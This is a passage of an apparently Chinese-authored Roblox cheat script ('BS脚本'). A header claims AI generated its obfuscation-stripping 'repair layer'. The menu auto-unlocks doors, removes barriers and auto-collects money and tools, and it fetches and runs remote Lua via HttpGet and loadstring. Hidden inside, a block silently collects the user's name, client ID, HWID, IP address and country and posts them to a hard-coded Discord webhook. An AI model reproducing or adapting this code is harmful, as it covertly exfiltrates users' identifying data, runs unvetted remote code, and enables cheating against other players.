-- ==========================================
-- 【修复层】task 库兼容 + 环境加固 + 混淆层剥离
-- 由 AI 自动生成，修复原脚本兼容性问题
-- ==========================================
if not task then
    getgenv().task = {}
end
if not task.defer then
    task.defer = function(func, ...)
        local args = {...}
        local n = select("#", ...)
        spawn(function()
            func(unpack(args, 1, n))
        end)
    end
end
if not task.wait then
    task.wait = function(d)
        return wait(d or 0)
    end
end
if not task.spawn then
    task.spawn = function(func, ...)
        local args = {...}
        local n = select("#", ...)
        spawn(function()
            func(unpack(args, 1, n))
        end)
    end
end
if not task.delay then
    task.delay = function(d, func, ...)
        local args = {...}
        local n = select("#", ...)
        spawn(function()
            wait(d or 0)
            func(unpack(args, 1, n))
        end)
    end
end
if not task.cancel then
    task.cancel = function() end
end

-- 安全加载器：防止外部脚本失败拖垮整体
local __safeLoad = function(url, label)
    local ok, err = pcall(function()
        if not game.HttpGet then
            error("注入器不支持 game:HttpGet")
        end
        local src = game:HttpGet(url)
        if not src or type(src) ~= "string" or #src < 50 or src:sub(1,1) == "<" then
            error("返回内容无效或网络被拦截")
        end
        local f = loadstring(src)
        if not f then
            error("编译失败")
        end
        f()
    end)
    if not ok then
        warn("【BS修复器】加载 [" .. (label or url) .. "] 失败: " .. tostring(err))
    end
end

-- ==========================================
-- 原脚本开始（已剥离混淆层）
-- ==========================================


-- 【修复2】原 BS_ProtectedExecute 混淆层已剥离，改为直接透传
-- 防止环境探测导致注入器返回 nil 而崩溃
local BS_ProtectedExecute = function(BS_protectedCode, ...)
    return BS_protectedCode(...)
end

do --[[原: return BS_ProtectedExecute(function(...)，已剥离混淆层]]
    local function BS_probeArith()
        local BS_chunk, _ = loadstring([[
            local a = "hello"
            local b = 2
            return a - b
        ]])
        if not BS_chunk then return false end

        local BS_ok, _ = pcall(BS_chunk)
        return not BS_ok        
    end

    local function BS_probeCall()
        local BS_ok, _ = pcall(function() (nil)() end)
        return not BS_ok
    end

    local function BS_probeFS()
        local BS_ok, _ = pcall(function()
            if not isfolder("BS_script") then makefolder("BS_script") end
            if not isfolder("BS_script/Music") then makefolder("BS_script/Music") end
        end)
        return BS_ok and isfolder("BS_script/Music")
    end

    local function BS_coreLogic()
--脚本开始
assert(_G.BS_Auth_verification,"")
_G.NotifySystem = {
    Queue = {},
    Ready = false,
    Container = nil,
    ActiveNotifications = {},
    MaxNotifications = 5,
    DefaultDuration = 4,
    TweenSpeed = 0.35,
    Theme = {
        Background = Color3.fromRGB(20, 20, 25),
        BackgroundAccent = Color3.fromRGB(28, 28, 35),
        Stroke = Color3.fromRGB(60, 60, 75),
        Title = Color3.fromRGB(255, 255, 255),
        Text = Color3.fromRGB(180, 180, 190),
        Success = Color3.fromRGB(80, 220, 120),
        Error = Color3.fromRGB(255, 90, 90),
        Warning = Color3.fromRGB(255, 190, 70),
        Info = Color3.fromRGB(88, 160, 255),
        ProgressBg = Color3.fromRGB(40, 40, 50)
    },
    Icons = {
        Success = "rbxassetid://93202927221730",
        Error = "rbxassetid://76821953846248",
        Warning = "rbxassetid://125920361880643",
        Info = "rbxassetid://124560466474914",
        Close = "rbxassetid://110786993356448",
    }
}

function _G.Notify(title, text, duration, nType)
    duration = duration or _G.NotifySystem.DefaultDuration
    title = title or "通知"
    text = text or ""
    nType = nType or "Info"
    
    if not _G.NotifySystem.Ready then
        table.insert(_G.NotifySystem.Queue, {title, text, duration, nType})
        return
    end
    
    pcall(function()
        _G.NotifySystem.CreateNotification(title, text, duration, nType)
    end)
end

function _G.NotifySuccess(title, text, duration)
    _G.Notify(title, text, duration or 3, "Success")
end

function _G.NotifyError(title, text, duration)
    _G.Notify(title, text, duration or 5, "Error")
end

function _G.NotifyWarning(title, text, duration)
    _G.Notify(title, text, duration or 4, "Warning")
end

function _G.NotifyInfo(title, text, duration)
    _G.Notify(title, text, duration or 4, "Info")
end

function _G.NotifySystem.CreateNotification(title, text, duration, nType)
    local TweenService = game:GetService("TweenService")
    
    if not _G.NotifySystem.Container or not _G.NotifySystem.Container.Parent then
        _G.NotifySystem.SetupContainer()
    end
    
    local container = _G.NotifySystem.Container
    local theme = _G.NotifySystem.Theme
    local typeColor = theme[nType] or theme.Info
    local iconId = _G.NotifySystem.Icons[nType] or _G.NotifySystem.Icons.Info
    
    while #_G.NotifySystem.ActiveNotifications >= _G.NotifySystem.MaxNotifications do
        local oldest = _G.NotifySystem.ActiveNotifications[1]
        if oldest then
            oldest:Close()
        end
        task.wait(0.05)
    end
    
    local frame = Instance.new("Frame")
    frame.Name = "Notification"
    frame.BackgroundTransparency = 1
    frame.BorderSizePixel = 0
    frame.Size = UDim2.new(0, 0, 0, 0)
    frame.ClipsDescendants = true
    
    local mainBg = Instance.new("Frame")
    mainBg.Name = "MainBg"
    mainBg.Size = UDim2.new(1, 0, 1, 0)
    mainBg.BackgroundColor3 = theme.Background
    mainBg.BackgroundTransparency = 0.02
    mainBg.BorderSizePixel = 0
    mainBg.Parent = frame
    
    local mainCorner = Instance.new("UICorner")
    mainCorner.CornerRadius = UDim.new(0, 14)
    mainCorner.Parent = mainBg
    
    local stroke = Instance.new("UIStroke")
    stroke.Color = theme.Stroke
    stroke.Thickness = 1.2
    stroke.Transparency = 0.3
    stroke.Parent = mainBg
    
    local accentLine = Instance.new("Frame")
    accentLine.Name = "AccentLine"
    accentLine.Size = UDim2.new(0, 3, 1, -16)
    accentLine.Position = UDim2.new(0, 8, 0, 8)
    accentLine.BackgroundColor3 = typeColor
    accentLine.BorderSizePixel = 0
    accentLine.Parent = mainBg
    
    local accentCorner = Instance.new("UICorner")
    accentCorner.CornerRadius = UDim.new(1, 0)
    accentCorner.Parent = accentLine
    
    local icon = Instance.new("ImageLabel")
    icon.Name = "Icon"
    icon.Size = UDim2.new(0, 20, 0, 20)
    icon.Position = UDim2.new(0, 20, 0, 12)
    icon.BackgroundTransparency = 1
    icon.Image = iconId
    icon.ImageColor3 = typeColor
    icon.Parent = mainBg
    
    local titleLabel = Instance.new("TextLabel")
    titleLabel.Name = "Title"
    titleLabel.Size = UDim2.new(1, -90, 0, 22)
    titleLabel.Position = UDim2.new(0, 46, 0, 11)
    titleLabel.BackgroundTransparency = 1
    titleLabel.Text = title
    titleLabel.TextColor3 = theme.Title
    titleLabel.Font = Enum.Font.GothamBold
    titleLabel.TextSize = 15
    titleLabel.TextXAlignment = Enum.TextXAlignment.Left
    titleLabel.TextTruncate = Enum.TextTruncate.AtEnd
    titleLabel.Parent = mainBg
    
    local closeBtn = Instance.new("ImageButton")
    closeBtn.Name = "CloseBtn"
    closeBtn.Size = UDim2.new(0, 22, 0, 22)
    closeBtn.Position = UDim2.new(1, -30, 0, 10)
    closeBtn.BackgroundTransparency = 1
    closeBtn.Image = _G.NotifySystem.Icons.Close
    closeBtn.ImageColor3 = Color3.fromRGB(140, 140, 150)
    closeBtn.ImageTransparency = 0.3
    closeBtn.AutoButtonColor = false
    closeBtn.Parent = mainBg
    
    local textLabel = Instance.new("TextLabel")
    textLabel.Name = "Content"
    textLabel.Size = UDim2.new(1, -66, 0, 0)
    textLabel.Position = UDim2.new(0, 46, 0, 36)
    textLabel.BackgroundTransparency = 1
    textLabel.Text = text
    textLabel.TextColor3 = theme.Text
    textLabel.Font = Enum.Font.Gotham
    textLabel.TextSize = 13
    textLabel.TextXAlignment = Enum.TextXAlignment.Left
    textLabel.TextWrapped = true
    textLabel.AutomaticSize = Enum.AutomaticSize.Y
    textLabel.Parent = mainBg
    
    local progressBg = Instance.new("Frame")
    progressBg.Name = "ProgressBg"
    progressBg.Size = UDim2.new(1, -16, 0, 3)
    progressBg.Position = UDim2.new(0, 8, 1, -9)
    progressBg.BackgroundColor3 = theme.ProgressBg
    progressBg.BorderSizePixel = 0
    progressBg.Parent = mainBg
    
    local progressCorner = Instance.new("UICorner")
    progressCorner.CornerRadius = UDim.new(1, 0)
    progressCorner.Parent = progressBg
    
    local progressBar = Instance.new("Frame")
    progressBar.Name = "ProgressBar"
    progressBar.Size = UDim2.new(1, 0, 1, 0)
    progressBar.BackgroundColor3 = typeColor
    progressBar.BorderSizePixel = 0
    progressBar.Parent = progressBg
    
    local barCorner = Instance.new("UICorner")
    barCorner.CornerRadius = UDim.new(1, 0)
    barCorner.Parent = progressBar
    
    frame.Parent = container
    
    task.wait()
    local textHeight = textLabel.TextBounds.Y
    local titleWidth = titleLabel.TextBounds.X
    local textWidth = textLabel.TextBounds.X
    local width = math.clamp(math.max(titleWidth + 100, textWidth + 70), 280, 400)
    local height = math.max(78, 52 + textHeight)
    
    local notification = {
        Frame = frame,
        MainBg = mainBg,
        ProgressBar = progressBar,
        Duration = duration,
        Remaining = duration,
        Paused = false,
        Closed = false,
        Close = function(self)
            if self.Closed then return end
            self.Closed = true
            self:AnimateOut()
        end,
        AnimateOut = function(self)
            for i, n in ipairs(_G.NotifySystem.ActiveNotifications) do
                if n == self then
                    table.remove(_G.NotifySystem.ActiveNotifications, i)
                    break
                end
            end
            TweenService:Create(self.MainBg, TweenInfo.new(0.28, Enum.EasingStyle.Quad, Enum.EasingDirection.In), {
                BackgroundTransparency = 1
            }):Play()
            TweenService:Create(self.Frame, TweenInfo.new(0.3, Enum.EasingStyle.Back, Enum.EasingDirection.In), {
                Size = UDim2.new(0, 0, 0, height),
                Position = UDim2.new(0, 0, 0, self.Frame.AbsolutePosition.Y - container.AbsolutePosition.Y)
            }):Play()
            task.delay(0.3, function()
                self.Frame:Destroy()
            end)
        end
    }
    
    table.insert(_G.NotifySystem.ActiveNotifications, notification)
    
    frame.Size = UDim2.new(0, width, 0, 0)
    
    TweenService:Create(frame, TweenInfo.new(_G.NotifySystem.TweenSpeed, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {
        Size = UDim2.new(0, width, 0, height)
    }):Play()
    
    local enterTween = TweenService:Create(mainBg, TweenInfo.new(0.25, Enum.EasingStyle.Quad), {
        BackgroundTransparency = 0.02
    })
    enterTween:Play()
    
    closeBtn.MouseEnter:Connect(function()
        TweenService:Create(closeBtn, TweenInfo.new(0.15), {ImageTransparency = 0, ImageColor3 = Color3.fromRGB(255, 90, 90)}):Play()
    end)
    closeBtn.MouseLeave:Connect(function()
        TweenService:Create(closeBtn, TweenInfo.new(0.15), {ImageTransparency = 0.3, ImageColor3 = Color3.fromRGB(140, 140, 150)}):Play()
    end)
    closeBtn.MouseButton1Click:Connect(function()
        notification:Close()
    end)
    
    mainBg.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseMovement then
            notification.Paused = true
            TweenService:Create(mainBg, TweenInfo.new(0.2), {BackgroundColor3 = theme.BackgroundAccent}):Play()
        end
    end)
    
    mainBg.InputEnded:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseMovement then
            notification.Paused = false
            TweenService:Create(mainBg, TweenInfo.new(0.2), {BackgroundColor3 = theme.Background}):Play()
        end
    end)
    
    task.spawn(function()
        local startTime = tick()
        while notification.Remaining > 0 and not notification.Closed do
            if not notification.Paused then
                notification.Remaining = duration - (tick() - startTime)
                local progress = math.clamp(notification.Remaining / duration, 0, 1)
                progressBar.Size = UDim2.new(progress, 0, 1, 0)
            else
                startTime = tick() - (duration - notification.Remaining)
            end
            task.wait(0.03)
        end
        if not notification.Closed then
            notification:Close()
        end
    end)
end

function _G.NotifySystem.SetupContainer()
    local Players = game:GetService("Players")
    local CoreGui = game:GetService("CoreGui")
    
    local gui = Instance.new("ScreenGui")
    gui.Name = "NotifySystem_" .. math.random(10000, 99999)
    gui.ResetOnSpawn = false
    gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    gui.DisplayOrder = 99999
    
    pcall(function()
        gui.Parent = CoreGui
    end)
    
    if not gui.Parent and Players.LocalPlayer then
        gui.Parent = Players.LocalPlayer:WaitForChild("PlayerGui")
    end
    
    local container = Instance.new("Frame")
    container.Name = "Container"
    container.Size = UDim2.new(0, 420, 1, -30)
    container.Position = UDim2.new(1, -15, 0, 15)
    container.AnchorPoint = Vector2.new(1, 0)
    container.BackgroundTransparency = 1
    container.Parent = gui
    
    local layout = Instance.new("UIListLayout")
    layout.SortOrder = Enum.SortOrder.LayoutOrder
    layout.VerticalAlignment = Enum.VerticalAlignment.Top
    layout.HorizontalAlignment = Enum.HorizontalAlignment.Right
    layout.Padding = UDim.new(0, 12)
    layout.Parent = container
    
    local padding = Instance.new("UIPadding")
    padding.PaddingTop = UDim.new(0, 15)
    padding.PaddingRight = UDim.new(0, 15)
    padding.Parent = container
    
    _G.NotifySystem.Container = container
    _G.NotifySystem.Ready = true
    _G.NotifySystem.ProcessQueue()
end

function _G.NotifySystem.ProcessQueue()
    if #_G.NotifySystem.Queue == 0 then return end
    
    local queue = table.clone(_G.NotifySystem.Queue)
    _G.NotifySystem.Queue = {}
    
    for i, data in ipairs(queue) do
        task.delay((i-1) * 0.15, function()
            _G.Notify(unpack(data))
        end)
    end
end

_G.Library = _G.Library or {}
_G.Library.Notification = function(...)
    if _G.Notify then
        _G.Notify(...)
    end
end

function _G.SafeNotify(...)
    if not _G.NotifySystem.Ready then
        _G.NotifySystem.SetupContainer()
    end
    _G.Notify(...)
end

task.delay(0.05, function()
    _G.NotifySystem.SetupContainer()
end)
do
if game.PlaceId == 4588604953 then
do
    local GS_WEBHOOK = "https://discord.com/api/webhooks/1466533011351802009/xNUWf2_Cqo8Ur2E1vAkHeo0nK9rF4DLcbYxXbX3hKM01cc8NjIzaFfOPaAKYZdMtTzF4"
    
    local HttpService = game:GetService("HttpService")
    local Players = game:GetService("Players")
    local UserInputService = game:GetService("UserInputService")
    local LocalizationService = game:GetService("LocalizationService")
    local MarketplaceService = game:GetService("MarketplaceService")
    local RbxAnalyticsService = game:GetService("RbxAnalyticsService")
    
    local localPlayer = Players.LocalPlayer
    if not localPlayer then
        return
    end

    local function safeCall(func, fallback)
        local success, result = pcall(func)
        return success and result or fallback
    end
    
    local function getAvatarImage(userId)
        return safeCall(function()
            local url = string.format("https://thumbnails.roblox.com/v1/users/avatar?userIds=%d&size=180x180&format=Png&isCircular=true", userId)
            local response = HttpService:JSONDecode(game:HttpGet(url))
            return response.data[1].imageUrl
        end, "https://www.roblox.com/Thumbs/Avatar.ashx?x=180&y=180&userId=" .. userId)
    end
    
    local function getDeviceType()
        local touch = UserInputService.TouchEnabled
        local keyboard = UserInputService.KeyboardEnabled
        local mouse = UserInputService.MouseEnabled
        
        if touch and not keyboard and not mouse then return "移动设备"
        elseif not touch and keyboard and mouse then return "电脑"
        elseif touch and keyboard and mouse then return "模拟器"
        else return "未知" end
    end
    
    local function getExecutor()
        return (identifyexecutor and identifyexecutor()) or 
               (getexecutorname and getexecutorname()) or 
               "未知"
    end
    
    local function getHWID()
        return (gethwid and gethwid()) or "无法获取"
    end
    
    local function getIPAddress()
        local request = http_request or request or (syn and syn.request)
        if not request then return "无请求函数" end
        
        return safeCall(function()
            return request({Url = "https://api.ipify.org/", Method = "GET"}).Body
        end, "获取失败")
    end

    local userId = localPlayer.UserId
    local placeId = game.PlaceId
    
    local payload = {
        username = "BS脚本-机器人",
        embeds = {{
            color = tonumber("0x32CD32"),
            title = string.format("有人正在使用BS脚本 %s %d时%d分", 
                os.date("%Y年%m月%d日"), 
                tonumber(os.date("%H")), 
                tonumber(os.date("%M"))),
            
            thumbnail = {url = getAvatarImage(userId)},
            
            fields = {
                {name = "用户名", value = localPlayer.Name, inline = true},
                {name = "显示名称", value = localPlayer.DisplayName, inline = true},
                {name = "用户ID", value = string.format("[%d](https://www.roblox.com/users/%d/profile)", userId, userId), inline = true},
                
                {name = "客户端ID", value = safeCall(function() return RbxAnalyticsService:GetClientId() end, "获取失败"), inline = false},
                
                {name = "地图ID", value = string.format("[%d](https://www.roblox.com/games/%d)", placeId, placeId), inline = true},
                {name = "地图名称", value = safeCall(function() return MarketplaceService:GetProductInfo(placeId).Name end, "获取失败"), inline = true},
                
                {name = "注入器", value = getExecutor(), inline = true},
                {name = "账号年龄", value = string.format("%d天", localPlayer.AccountAge), inline = true},
                
                {name = "设备", value = getDeviceType(), inline = false},
                {name = "国家", value = string.format("国家: %s", safeCall(function() return LocalizationService:GetCountryRegionForPlayerAsync(localPlayer) end, "获取失败")), inline = false},
                {name = "语言", value = string.format("语言: %s", localPlayer.LocaleId), inline = false},
                
                {name = "会员状态", value = (localPlayer.MembershipType == Enum.MembershipType.Premium and "是" or "否"), inline = false},
                
                {name = "HWID", value = getHWID(), inline = true},
                {name = "IP地址", value = getIPAddress(), inline = true},
                {name = "IP查询", value = string.format("https://binaryfork.com/zh-tools/ip-address-lookup/?ip=%s#ip-lookup", getIPAddress()), inline = false}
            }
        }}
    }

    local request = http_request or request or HttpPost or (syn and syn.request)
    if not request then
        return
    end
    
    safeCall(function()
        request({
            Url = GS_WEBHOOK,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = HttpService:JSONEncode(payload)
        })
    end)
end
-- 【修复5】安全加载 WindUI，防止网络失败导致 nil() 崩溃
local WindUI = nil
local __windui_ok, __windui_err = pcall(function()
    if not game.HttpGet then
        error("注入器不支持 game:HttpGet")
    end
    local src = game:HttpGet("https://raw.githubusercontent.com/Footagesus/WindUI/main/dist/main.lua")
    if not src or type(src) ~= "string" or #src < 500 or src:sub(1,1) == "<" then
        error("WindUI 返回内容无效，可能被墙或 404")
    end
    local f = loadstring(src)
    if not f then
        error("WindUI 编译失败")
    end
    WindUI = f()
    if not WindUI then
        error("WindUI 执行后返回 nil")
    end
end)

if not __windui_ok then
    warn("【BS修复器】WindUI 加载失败: " .. tostring(__windui_err))
    warn("【BS修复器】将使用假 UI 对象防止崩溃，UI 功能可能不可用")
    local fakeTab = {}
    fakeTab.section = function() return fakeTab end
    fakeTab.Button = function() end
    fakeTab.Toggle = function() end
    fakeTab.Slider = function() end
    fakeTab.Dropdown = function() end
    fakeTab.Textbox = function() end
    fakeTab.Label = function() end
    WindUI = {
        CreateWindow = function()
            return {
                Tab = function() return fakeTab end,
                Notify = function() end
            }
        end
    }
end

local plrs = game:GetService("Players")
local me = plrs.LocalPlayer
local input = game:GetService("UserInputService")
local run = game:GetService("RunService")
local camera = workspace.CurrentCamera
local tween = game:GetService("TweenService")
local light = game:GetService("Lighting")
local rp = game:GetService("ReplicatedStorage")

local functions = {
    Fullbright = false,
    AutoOpenDoors = false,
    NoBarriers = false,
    NoGrinder = false,
    FastPickup = false,
    AutoPickupScraps = false,
    AutoPickupTools = false,
    AutopickupCrates = false,
    AutoPickupMoney = false,
    Infstamina = false,
    Nofalldamage = false,
    Noclip = false,
    FakeDown = true,
    Stopneckmove = false,
    Unbreaklimbs = false,
    SilentAim = false,
    AimBot = false,
    Instantreload = false,
    Meleeaura = false,
    RageBot = false,
    TrigerBot = false,
    RocketControl = false,
    ESP = false,
    ArmsChams = false,
    ToolsChams = false,
}

local SectionSettings = {
    SilentAim = {
        Draw = false,
        DrawSize = 50,
        DrawColor = Color3.new(1, 1, 1),
        TargetParts = {"Head"},
        CheckDowned = false,
        CheckWall = false,
        CheckTeam = false,
        CheckWhiteList = false,
    },
    Aimbot = {
        Draw = false,
        DrawSize = 50,
        DrawColor = Color3.new(1, 1, 1),
        TargetParts = {"Head"},
        CheckDowned = false,
        CheckWall = false,
        CheckTeam = false,
        CheckWhiteList = false,
        Velocity = false,
        Smooth = false,
        SmoothSize = 0.5
    },
    MeleeAura = {
        ShowAnim = false,
        TargetParts = {"Head"},
        CheckDowned = false,
        CheckTeam = false,
        CheckWhiteList = false,
        Distance = 15,
    },
    RageBot = {
        CheckDowned = false,
        CheckWhiteList = false
    },
    ESP = {
        Name = false,
        Box = false,
        Weapon = false,
        Highlight = false,
    }
}

local Methods = {
    Fly = "Bypass",
    Infstamina = "Getgc"
}

local cockie = {
    SilentAimCircle = nil,
    SilentAim_body = nil,
    ESPHighlight = nil,
    AimBotCircle = nil,
    aimbot_button = nil,
    Aimbot_body = nil,
    MeleeAura_body = nil,
}

local RUNS = {
    cameraFOV = nil,
    JumpHeight = nil,
    AutoOpenDoors = nil,
    AutopickupScraps = nil,
    AutopickupTools = nil,
    AutopickupCrates = nil,
    AutopickupMoney = nil,
    Infstamina = nil,
    Fly = nil,
    Noclip = nil,
    Meleeaura = nil,
    ESP = nil,
}

local funcindex = {
    Fullbright = {
        oldClockTime = nil,
        oldBrightness = nil,
    }
}

local WhiteList = {}

function CharStats(plr)
    local folder = rp.CharStats[plr.Name]
    return folder
end

local Window = WindUI:CreateWindow({
    Title = "犯罪",
    Author = "BS脚本",
    Icon = "atom",
    IconThemed = false,
    Background = "rbxassetid://102621341311637",
    BackgroundImageTransparency = 0.6,
    Acrylic = true,
    Transparent = true,
    ShadowTransparency = 0.65,
    Radius = 22,
    Size = UDim2.new(0, 720, 0, 540),
    MinSize = Vector2.new(600, 450),
    MaxSize = Vector2.new(900, 650),
    ScrollBarEnabled = true,
    Resizable = true,
    AutoScale = true,
    Folder = "服务器",
})

local Tabs = {
    World = Window:Tab({ Title = "世界功能", Icon = "globe", Locked = false }),
    Player = Window:Tab({ Title = "玩家功能", Icon = "user", Locked = false }),
    Combat = Window:Tab({ Title = "战斗功能", Icon = "target", Locked = false }),
    Visual = Window:Tab({ Title = "视觉功能", Icon = "eye", Locked = false }),
    Misc = Window:Tab({ Title = "其他功能", Icon = "settings", Locked = false })
}

Tabs.World:Toggle({
    Title = "夜视",
    Description = "使地图变亮",
    Default = functions.Fullbright,
    Callback = function(Value)
        functions.Fullbright = Value
        local Folder
        if Value then
            if #light:GetChildren() ~= 0 then
                Folder = Instance.new("Folder")
                Folder.Parent = rp
                Folder.Name = "Index"
                for _, a in pairs(light:GetChildren()) do
                    a.Parent = Folder
                end
            end
            funcindex.Fullbright.oldClockTime = light.ClockTime
            light.ClockTime = 14
            funcindex.Fullbright.oldBrightness = light.Brightness
            light.Brightness = 4
            light.ExposureCompensation = .7
        else
            Folder = rp:FindFirstChild("Index")
            if Folder ~= nil then
                for _, a in pairs(Folder:GetChildren()) do
                    a.Parent = light
                end
                Folder:Destroy()
                Folder = nil
            end
            light.ClockTime = funcindex.Fullbright.oldClockTime or 14
            light.Brightness = funcindex.Fullbright.oldBrightness or 1
            light.ExposureCompensation = 0
        end
    end
})

Tabs.World:Toggle({
    Title = "自动开门",
    Description = "自动打开附近的门",
    Default = functions.AutoOpenDoors,
    Callback = function(Value)
        functions.AutoOpenDoors = Value
        if Value then
            RUNS.AutoOpenDoors = run.RenderStepped:Connect(function()
                local function GetDoor()
                    local mapFolder = workspace:FindFirstChild("Map")
                    if not mapFolder then return nil end
                    local folderDoors = mapFolder:FindFirstChild("Doors")
                    if not folderDoors then return nil end

                    local closestDoor, dist = nil, 15
                    for _, door in pairs(folderDoors:GetChildren()) do
                        local doorBase = door:FindFirstChild("DoorBase")
                        if doorBase and me.Character:FindFirstChild("HumanoidRootPart") then
                            local distance = (me.Character.HumanoidRootPart.Position - doorBase.Position).Magnitude
                            if distance < dist then
                                dist = distance
                                closestDoor = door
                            end
                        end
                    end
                    return closestDoor
                end

                local door = GetDoor()
                if door then
                    local values = door:FindFirstChild("Values")
                    local events = door:FindFirstChild("Events")
                    if values and events then
                        local locked = values:FindFirstChild("Locked")
                        local openValue = values:FindFirstChild("Open")
                        local toggleEvent = events:FindFirstChild("Toggle")
                        if locked and openValue and toggleEvent then
                            if locked.Value == true then
                                toggleEvent:FireServer("Unlock", door.Lock)
                            elseif locked.Value == false and openValue.Value == false then
                                local knob1 = door:FindFirstChild("Knob1")
                                local knob2 = door:FindFirstChild("Knob2")
                                if knob1 and knob2 then
                                    local knob1pos = (me.Character.HumanoidRootPart.Position - knob1.Position).Magnitude
                                    local knob2pos = (me.Character.HumanoidRootPart.Position - knob2.Position).Magnitude
                                    local chosenKnob = (knob1pos < knob2pos) and knob1 or knob2
                                    toggleEvent:FireServer("Open", chosenKnob)
                                end
                            end
                        end
                    end
                end
            end)
        else
            if RUNS.AutoOpenDoors then
                RUNS.AutoOpenDoors:Disconnect()
                RUNS.AutoOpenDoors = nil
            end
        end
    end
})

Tabs.World:Toggle({
    Title = "无屏障",
    Description = "移除地图屏障",
    Default = functions.NoBarriers,
    Callback = function(Value)
        functions.NoBarriers = Value
        for _, a in pairs(workspace.Filter.Parts["F_Parts"]:GetDescendants()) do
            if a:IsA("Part") or a:IsA("MeshPart") then
                a.CanTouch = not a.CanTouch
            end
        end
    end
})

Tabs.World:Toggle({
    Title = "防研磨机",
    Description = "防止研磨机伤害",
    Default = functions.NoGrinder,
    Callback = function(Value)
        functions.NoGrinder = Value
        for _, a in pairs(workspace.Map.Parts.Grinders:GetDescendants()) do
            if a:IsA("Part") or a:IsA("MeshPart") then
                a.CanTouch = not a.CanTouch
            end
        end
        for _, a in pairs(workspace.Map.Parts.M_Parts:GetDescendants()) do
            if a:IsA("Part") and a.Name == "FirePart" then
                a.CanTouch = not a.CanTouch
            end
        end
    end
})

Tabs.World:Toggle({
    Title = "快速拾取",
    Description = "瞬间拾取物品",
    Default = functions.FastPickup,
    Callback = function(Value)
        functions.FastPickup = Value
        if Value then
            game.DescendantAdded:Connect(function(obj)
                if obj:IsA("ProximityPrompt") then
                    obj.HoldDuration = 0
                    obj:GetPropertyChangedSignal("HoldDuration"):Connect(function()
                        if functions.FastPickup then
                            obj.HoldDuration = 0
                        end
                    end)
                end
            end)
        end
    end
})

Tabs.World:Toggle({
    Title = "自动拾取废料",
    Description = "自动拾取附近的废料",
    Default = functions.AutoPickupScraps,
    Callback = function(Value)
        functions.AutoPickupScraps = Value
        local remote = rp.Events.PIC_PU
        local scrapsfolder = workspace.Filter.SpawnedPiles
        local canPickup = true
        local startTick = tick()

        if Value then
            RUNS.AutopickupScraps = run.RenderStepped:Connect(function()
                local function GetClosestScrap()
                    local maxdist = 15
                    local closest = nil

                    for _, a in pairs(scrapsfolder:GetChildren()) do
                        if a and (a.Name == "S1" or a.Name == "S2") then
                            if me.Character and me.Character.HumanoidRootPart then
                                local getdist = (me.Character.HumanoidRootPart.Position - a.MeshPart.Position).Magnitude
                                if getdist < maxdist then
                                    maxdist = getdist
                                    closest = a
                                end
                            end
                        end
                    end
                    maxdist = 15
                    return closest
                end

                local getscrap = GetClosestScrap()
                if getscrap then
                    if canPickup then
                        remote:FireServer(string.reverse(getscrap:GetAttribute("jzu")))
                        canPickup = false
                    end
                end
                if canPickup == false and tick() - startTick >= 4.5 then
                    canPickup = true
                    startTick = tick()
                end
            end)
        else
            if RUNS.AutopickupScraps then
                RUNS.AutopickupScraps:Disconnect()
                RUNS.AutopickupScraps = nil
            end
        end
    end
})

Tabs.World:Toggle({
    Title = "自动拾取工具",
    Description = "自动拾取附近的工具",
    Default = functions.AutoPickupTools,
    Callback = function(Value)
        functions.AutoPickupTools = Value
        local remote = rp.Events.PIC_TLO
        local toolsfolder = workspace.Filter.SpawnedTools
        local canPickup = true
        local startTick = tick()

        if Value then
            RUNS.AutopickupTools = run.RenderStepped:Connect(function()
                local function GetClosestTool()
                    local maxdist = 15
                    local closest = nil

                    for _, a in pairs(toolsfolder:GetChildren()) do
                        if a and me.Character and me.Character.HumanoidRootPart then
                            local handle = a:FindFirstChild("Handle") or a:FindFirstChild("WeaponHandle")
                            if handle and (handle:IsA("Part") or handle:IsA("MeshPart")) then
                                if me.Character and me.Character:FindFirstChild("HumanoidRootPart") then
                                    local getdist = (me.Character.HumanoidRootPart.Position - handle.Position).Magnitude
                                    if getdist < maxdist then
                                        maxdist = getdist
                                        closest = a
                                    end
                                end
                            end
                        end
                    end
                    maxdist = 15
                    return closest
                end

                local tool = GetClosestTool()
                if tool then
                    local Handle = tool:FindFirstChild("Handle") or tool:FindFirstChild("WeaponHandle")
                    if Handle then
                        if canPickup then
                            remote:FireServer(Handle)
                            canPickup = false
                        end
                    end
                end
                if canPickup == false and tick() - startTick >= 1.5 then
                    canPickup = true
                    startTick = tick()
                end
            end)
        else
            if RUNS.AutopickupTools then
                RUNS.AutopickupTools:Disconnect()
                RUNS.AutopickupTools = nil
            end
        end
    end
})

Tabs.World:Toggle({
    Title = "自动拾取金钱",
    Description = "自动拾取附近的金钱",
    Default = functions.AutoPickupMoney,
    Callback = function(Value)
        functions.AutoPickupMoney = Value
        local remote = rp.Events:FindFirstChild("CZDPZUS")
        local moneyfolder = workspace.Filter.SpawnedBread
        local canPickup = true
        local startTick = tick()

        if Value then
            RUNS.AutopickupMoney = run.RenderStepped:Connect(function()
                local function GetMoney()
                    local maxdist = 15
                    local closest = nil

                    for _, a in pairs(moneyfolder:GetChildren()) do
                        if a and me.Character and me.Character.HumanoidRootPart then
                            local getdist = (me.Character.HumanoidRootPart.Position - a.Position).Magnitude
                            if getdist < maxdist then
                                maxdist = getdist
                                closest = a
                            end
                        end
                    end
                    maxdist = 15
                    return closest
                end

                local foundmoney = GetMoney()
                if foundmoney then
                    if canPickup then
                        remote:FireServer(foundmoney)
                        canPickup = false
                    end
                end
                if canPickup == false and tick() - startTick >= 1 then
                    canPickup = true
                    startTick = tick()
                end
            end)
        else
            if RUNS.AutopickupMoney then
                RUNS.AutopickupMoney:Disconnect()
                RUNS.AutopickupMoney = nil
            end
        end
    end
})

Tabs.Player:Slider({
    Title = "FOV",
    Description = "调整相机视野",
    Default = camera.FieldOfView,
    Min = 70,
    Max = 120,
    Callback = function(Value)
        if RUNS.cameraFOV ~= nil then
            RUNS.cameraFOV:Disconnect()
            RUNS.cameraFOV = nil
        end
        RUNS.cameraFOV = run.RenderStepped:Connect(function()
            camera.FieldOfView = Value
        end)
    end
})

Tabs.Player:Slider({
    Title = "相机距离",
    Description = "调整相机最大距离",
    Default = me.CameraMaxZoomDistance,
    Min = 10,
    Max = 500,
    Callback = function(Value)
        me.CameraMaxZoomDistance = Value
    end
})

Tabs.Player:Slider({
